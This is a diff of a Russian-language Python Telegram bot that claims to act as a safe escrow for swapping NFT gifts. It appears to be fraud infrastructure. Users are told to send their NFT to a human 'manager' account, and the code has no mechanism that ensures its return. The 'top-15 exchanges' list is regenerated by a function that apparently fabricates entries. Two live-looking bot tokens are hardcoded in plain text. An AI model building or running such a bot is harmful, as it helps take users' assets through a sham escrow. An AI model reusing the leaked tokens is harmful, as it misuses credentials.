@@ -1,5 +1,5 @@
 # NFT Exchange Bot для iPhone
-# ФИНАЛЬНАЯ ВЕРСИЯ - БЕЗ ДУБЛЕЙ И ФЛУДА
+# ФИНАЛЬНАЯ ВЕРСИЯ - С НОВЫМ ТОКЕНОМ
 
 import requests
 import time
@@ -8,7 +8,7 @@ import random
 from datetime import datetime
 
 # ===== НАСТРОЙКИ =====
-TOKEN = "8487741416:AAHlISX26SKheAnTQJCv1rPHY-X0f3fWdI0"
+TOKEN = "8487741416:AAGbFLHfafBs6ChN95VhUrqzs5W_o6SfNrY"  # Новый токен
 ADMIN_ID = 174415647
 SUPPORT = "GiftExchangersSupport"
 MANAGER = "GiftExchangersManager"
@@ -19,9 +19,9 @@ deals = {}
 top_deals = []
 users = {}
 banned_users = set()
-last_message_ids = {}  # Для защиты от дублей
-user_states = {}  # Отдельно храним состояния
-user_temp = {}  # Отдельно временные данные
+last_message_ids = {}
+user_states = {}
+user_temp = {}
 
 settings = {
     "min_amount": 100,
@@ -55,9 +55,8 @@ def admin_keyboard():
         ]
     }
 
-# ===== ОТПРАВКА СООБЩЕНИЙ (с защитой от дублей) =====
+# ===== ОТПРАВКА СООБЩЕНИЙ =====
 def send_message(chat_id, text, keyboard=None, parse_mode="HTML"):
-    # Проверяем дубли
     if chat_id in last_message_ids:
         last_time, last_text = last_message_ids[chat_id]
         if time.time() - last_time < 2 and last_text == text[:50]:
@@ -141,12 +140,10 @@ def handle_message(message):
     username = message['from'].get('username', 'NoUsername')
     first_name = message['from'].get('first_name', 'Пользователь')
     
-    # Проверка на бан
     if user_id in banned_users:
         send_message(chat_id, "🚫 Вы забанены в боте!")
         return
     
-    # Запоминаем пользователя
     if user_id not in users:
         users[user_id] = {
             'username': username,
@@ -154,12 +151,10 @@ def handle_message(message):
             'chat_id': chat_id
         }
     
-    # ===== /start =====
     if text == '/start':
         send_message(chat_id, settings['banner_text'], main_keyboard())
         return
     
-    # ===== Информация =====
     if text == "ℹ️ Информация":
         info_text = """
 <b>📤 Наш проект создан для безопасного обмена NFT подарками среди пользователей Telegram'a.</b>
@@ -182,25 +177,17 @@ def handle_message(message):
         send_inline_keyboard(chat_id, info_text, buttons)
         return
     
-    # ===== Как происходит сделка =====
     if text == "❓ Как происходит сделка":
         deal_text = """
 <b>❓ Как происходит сделка в Gift Exchange?</b>
 
 • <b>Продавец и покупатель обговаривают условия сделки 🤝</b>
-
-• <b>Один участник сделки создаёт сделку через меню бота - @GiftExchangersBot 🎁</b>
-
-• <b>Второй участник сделки принимает сделку 📤</b>
-
-• <b>После того как 2 человека присоединились к сделке, первый участник передаёт NFT менеджеру - @GiftExchangersManager 💰</b>
-
-• <b>После передачи подарка, техподдержка моментально одобрит приход NFT</b>
-
-• <b>Затем вторая сторона передаёт NFT</b>
-
-• <b>Менеджер передаёт NFT первому участнику</b>
-
+• <b>Один участник создаёт сделку через меню бота - @GiftExchangersBot 🎁</b>
+• <b>Второй участник принимает сделку 📤</b>
+• <b>Первый передаёт NFT менеджеру - @GiftExchangersManager 💰</b>
+• <b>Техподдержка одобряет</b>
+• <b>Вторая сторона передаёт NFT</b>
+• <b>Менеджер передаёт NFT первому</b>
 • <b>Сделка завершена успешно! ✅</b>
         """
         buttons = [[
@@ -209,7 +196,6 @@ def handle_message(message):
         send_inline_keyboard(chat_id, deal_text, buttons)
         return
     
-    # ===== Техподдержка =====
     if text == "📞 Техподдержка":
         support_text = f"""
 <b>📞 Техническая поддержка:</b>
@@ -222,7 +208,6 @@ def handle_message(message):
         send_message(chat_id, support_text, main_keyboard())
         return
     
-    # ===== Топ-15 =====
     if text == "🏆 Топ-15 обменов":
         global top_deals
         if not top_deals:
@@ -234,18 +219,15 @@ def handle_message(message):
         send_message(chat_id, top_text)
         return
     
-    # ===== СОЗДАНИЕ СДЕЛКИ =====
     if text == "📝 Создать сделку":
         user_states[user_id] = 'waiting_username'
         user_temp[user_id] = {}
         send_message(chat_id, "<b>Введите @username второго участника сделки:</b>")
         return
     
-    # ===== Обработка состояний =====
     if user_id in user_states:
         state = user_states[user_id]
         
-        # Ожидание username
         if state == 'waiting_username':
             second_user = text.replace('@', '').strip()
             if second_user:
@@ -254,21 +236,18 @@ def handle_message(message):
                 send_message(chat_id, "<b>Введите ссылку на ВАШУ NFT (которую отдаете):</b>")
             return
         
-        # Ожидание своей NFT
         if state == 'waiting_my_nft':
             user_temp[user_id]['my_nft'] = text
             user_states[user_id] = 'waiting_his_nft'
             send_message(chat_id, "<b>Введите ссылку на ЕГО NFT (которую получаете):</b>")
             return
         
-        # Ожидание его NFT
         if state == 'waiting_his_nft':
             user_temp[user_id]['his_nft'] = text
             user_states[user_id] = 'waiting_amount'
             send_message(chat_id, f"<b>Введите сумму сделки в USD (от ${settings['min_amount']} до ${settings['max_amount']}):</b>")
             return
         
-        # Ожидание суммы
         if state == 'waiting_amount':
             try:
                 amount = float(text.replace('$', '').replace(',', '').strip())
@@ -280,7 +259,6 @@ def handle_message(message):
                     send_message(chat_id, f"<b>❌ Максимальная сумма: ${settings['max_amount']}!</b>")
                     return
                 
-                # Создаем сделку
                 deal_id = str(uuid.uuid4())[:8]
                 second_user = user_temp[user_id]['second_user']
                 my_nft = user_temp[user_id]['my_nft']
@@ -320,7 +298,6 @@ https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
                 
                 send_inline_keyboard(chat_id, deal_text, buttons)
                 
-                # Уведомление второму участнику
                 for uid, user_data in users.items():
                     if user_data.get('username') == second_user:
                         notify_text = f"""
@@ -341,7 +318,6 @@ https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
                         send_inline_keyboard(user_data['chat_id'], notify_text, accept_buttons)
                         break
                 
-                # Очищаем состояние
                 del user_states[user_id]
                 del user_temp[user_id]
                 
@@ -349,7 +325,6 @@ https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
                 send_message(chat_id, "<b>❌ Введите число!</b>")
             return
     
-    # ===== Обработка ссылки на сделку =====
     if text.startswith('/start deal_'):
         deal_id = text.replace('/start deal_', '')
         
@@ -378,7 +353,6 @@ https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
             send_message(chat_id, "<b>❌ Сделка не найдена!</b>", main_keyboard())
         return
     
-    # ===== Админ-панель =====
     if text == '/admin' and user_id == ADMIN_ID:
         admin_text = f"""
 <b>👨‍💼 ПАНЕЛЬ АДМИНИСТРАТОРА</b>
@@ -391,69 +365,67 @@ https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
         send_inline_keyboard(chat_id, admin_text, admin_keyboard()['inline_keyboard'])
         return
     
-    # ===== Админ: рассылка =====
-    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_broadcast':
-        del user_states[user_id]
-        sent = 0
-        for uid, user_data in users.items():
-            if uid != ADMIN_ID:
-                try:
-                    send_message(user_data['chat_id'], f"<b>📢 РАССЫЛКА:</b>\n\n{text}")
-                    sent += 1
-                    time.sleep(0.05)
-                except:
-                    pass
-        send_message(chat_id, f"<b>✅ Отправлено: {sent}</b>")
-        return
-    
-    # ===== Админ: бан =====
-    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_ban':
-        del user_states[user_id]
-        target = text.replace('@', '').strip()
-        for uid, user_data in users.items():
-            if user_data.get('username') == target or str(uid) == target:
-                banned_users.add(uid)
-                send_message(chat_id, f"<b>✅ @{target} забанен</b>")
-                return
-        send_message(chat_id, "<b>❌ Пользователь не найден</b>")
-        return
-    
-    # ===== Админ: разбан =====
-    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_unban':
-        del user_states[user_id]
-        target = text.replace('@', '').strip()
-        for uid in list(banned_users):
-            user_data = users.get(uid, {})
-            if user_data.get('username') == target or str(uid) == target:
-                banned_users.remove(uid)
-                send_message(chat_id, f"<b>✅ @{target} разбанен</b>")
-                return
-        send_message(chat_id, "<b>❌ Пользователь не найден</b>")
-        return
-    
-    # ===== Админ: баннер =====
-    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_banner':
-        del user_states[user_id]
-        settings['banner_text'] = text
-        send_message(chat_id, "<b>✅ Баннер обновлен!</b>")
-        return
-    
-    # ===== Админ: лимиты =====
-    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_limits':
-        del user_states[user_id]
-        try:
-            parts = text.replace('$', '').replace(' ', '').split('-')
-            if len(parts) == 2:
-                min_val = int(parts[0])
-                max_val = int(parts[1])
-                settings['min_amount'] = min_val
-                settings['max_amount'] = max_val
-                send_message(chat_id, f"<b>✅ Лимиты: ${min_val}-${max_val}</b>")
-            else:
-                send_message(chat_id, "<b>❌ Формат: мин-макс (например 100-300)</b>")
-        except:
-            send_message(chat_id, "<b>❌ Ошибка</b>")
-        return
+    if user_id == ADMIN_ID and user_id in user_states:
+        state = user_states[user_id]
+        
+        if state == 'admin_broadcast':
+            del user_states[user_id]
+            sent = 0
+            for uid, user_data in users.items():
+                if uid != ADMIN_ID:
+                    try:
+                        send_message(user_data['chat_id'], f"<b>📢 РАССЫЛКА:</b>\n\n{text}")
+                        sent += 1
+                        time.sleep(0.05)
+                    except:
+                        pass
+            send_message(chat_id, f"<b>✅ Отправлено: {sent}</b>")
+            return
+        
+        if state == 'admin_ban':
+            del user_states[user_id]
+            target = text.replace('@', '').strip()
+            for uid, user_data in users.items():
+                if user_data.get('username') == target or str(uid) == target:
+                    banned_users.add(uid)
+                    send_message(chat_id, f"<b>✅ @{target} забанен</b>")
+                    return
+            send_message(chat_id, "<b>❌ Пользователь не найден</b>")
+            return
+        
+        if state == 'admin_unban':
+            del user_states[user_id]
+            target = text.replace('@', '').strip()
+            for uid in list(banned_users):
+                user_data = users.get(uid, {})
+                if user_data.get('username') == target or str(uid) == target:
+                    banned_users.remove(uid)
+                    send_message(chat_id, f"<b>✅ @{target} разбанен</b>")
+                    return
+            send_message(chat_id, "<b>❌ Пользователь не найден</b>")
+            return
+        
+        if state == 'admin_banner':
+            del user_states[user_id]
+            settings['banner_text'] = text
+            send_message(chat_id, "<b>✅ Баннер обновлен!</b>")
+            return
+        
+        if state == 'admin_limits':
+            del user_states[user_id]
+            try:
+                parts = text.replace('$', '').replace(' ', '').split('-')
+                if len(parts) == 2:
+                    min_val = int(parts[0])
+                    max_val = int(parts[1])
+                    settings['min_amount'] = min_val
+                    settings['max_amount'] = max_val
+                    send_message(chat_id, f"<b>✅ Лимиты: ${min_val}-${max_val}</b>")
+                else:
+                    send_message(chat_id, "<b>❌ Формат: мин-макс (например 100-300)</b>")
+            except:
+                send_message(chat_id, "<b>❌ Ошибка</b>")
+            return
 
 # ===== ОБРАБОТКА КНОПОК =====
 def handle_callback(callback):
@@ -463,7 +435,6 @@ def handle_callback(callback):
     user_id = callback['from']['id']
     username = callback['from'].get('username', 'NoUsername')
     
-    # Принять сделку
     if data.startswith('accept_'):
         deal_id = data.replace('accept_', '')
         
@@ -489,7 +460,6 @@ def handle_callback(callback):
         deal['participant_name'] = username
         deal['status'] = 'in_progress'
         
-        # Добавляем в топ
         global top_deals
         top_deals.append({
             'user1': f"@{deal['creator_name']}",
@@ -497,16 +467,13 @@ def handle_callback(callback):
             'amount': deal['amount'],
             'date': datetime.now().strftime("%Y-%m-%d")
         })
-        # Сортируем и оставляем 15
         top_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
         
-        # Уведомление создателю
         send_message(
             deal['creator_id'],
             f"<b>✅ @{username} принял сделку!</b>\n\n<b>Передайте NFT менеджеру @{MANAGER}</b>"
         )
         
-        # Ответ принявшему
         edit_message(
             chat_id, 
             message_id, 
@@ -514,7 +481,6 @@ def handle_callback(callback):
         )
         return
     
-    # Отменить сделку
     if data.startswith('cancel_'):
         deal_id = data.replace('cancel_', '')
         if deal_id in deals and deals[deal_id]['creator_id'] == user_id:
@@ -522,12 +488,10 @@ def handle_callback(callback):
             edit_message(chat_id, message_id, f"<b>❌ Сделка #{deal_id} отменена</b>")
         return
     
-    # Главное меню
     if data == "main_menu":
         send_message(chat_id, settings['banner_text'], main_keyboard())
         return
     
-    # Как происходит сделка
     if data == "how_deal":
         deal_text = """
 <b>❓ Как происходит сделка в Gift Exchange?</b>
@@ -544,7 +508,6 @@ def handle_callback(callback):
         send_message(chat_id, deal_text)
         return
     
-    # Админ: статистика
     if data == "admin_stats" and user_id == ADMIN_ID:
         stats = f"""
 <b>📊 СТАТИСТИКА</b>
@@ -557,37 +520,31 @@ def handle_callback(callback):
         edit_message(chat_id, message_id, stats, admin_keyboard())
         return
     
-    # Админ: рассылка
     if data == "admin_broadcast" and user_id == ADMIN_ID:
         user_states[user_id] = 'admin_broadcast'
         edit_message(chat_id, message_id, "<b>📢 Введите текст рассылки:</b>")
         return
     
-    # Админ: бан
     if data == "admin_ban" and user_id == ADMIN_ID:
         user_states[user_id] = 'admin_ban'
         edit_message(chat_id, message_id, "<b>🚫 Введите @username для бана:</b>")
         return
     
-    # Админ: разбан
     if data == "admin_unban" and user_id == ADMIN_ID:
         user_states[user_id] = 'admin_unban'
         edit_message(chat_id, message_id, "<b>✅ Введите @username для разбана:</b>")
         return
     
-    # Админ: баннер
     if data == "admin_banner" and user_id == ADMIN_ID:
         user_states[user_id] = 'admin_banner'
         edit_message(chat_id, message_id, "<b>📝 Введите новый текст баннера:</b>")
         return
     
-    # Админ: лимиты
     if data == "admin_limits" and user_id == ADMIN_ID:
         user_states[user_id] = 'admin_limits'
         edit_message(chat_id, message_id, f"<b>💰 Введите лимиты (мин-макс):\nТекущие: ${settings['min_amount']}-${settings['max_amount']}</b>")
         return
     
-    # Админ: все сделки
     if data == "admin_deals" and user_id == ADMIN_ID:
         if not deals:
             edit_message(chat_id, message_id, "<b>📭 Нет сделок</b>", admin_keyboard())
@@ -601,7 +558,6 @@ def handle_callback(callback):
         edit_message(chat_id, message_id, text, admin_keyboard())
         return
     
-    # Админ: обновить топ
     if data == "admin_refresh_top" and user_id == ADMIN_ID:
         global top_deals
         top_deals = generate_top_15()
@@ -611,7 +567,6 @@ def handle_callback(callback):
         edit_message(chat_id, message_id, text, admin_keyboard())
         return
     
-    # Админ: закрыть
     if data == "admin_close" and user_id == ADMIN_ID:
         send_message(chat_id, settings['banner_text'], main_keyboard())
         return
@@ -621,6 +576,7 @@ def main():
     print("🚀 NFT Exchange Bot запущен!")
     print(f"🤖 Бот: @{BOT_USERNAME}")
     print(f"👑 Админ ID: {ADMIN_ID}")
+    print(f"🔑 Токен: {TOKEN[:10]}...")
     
     global top_deals
     top_deals = generate_top_15()
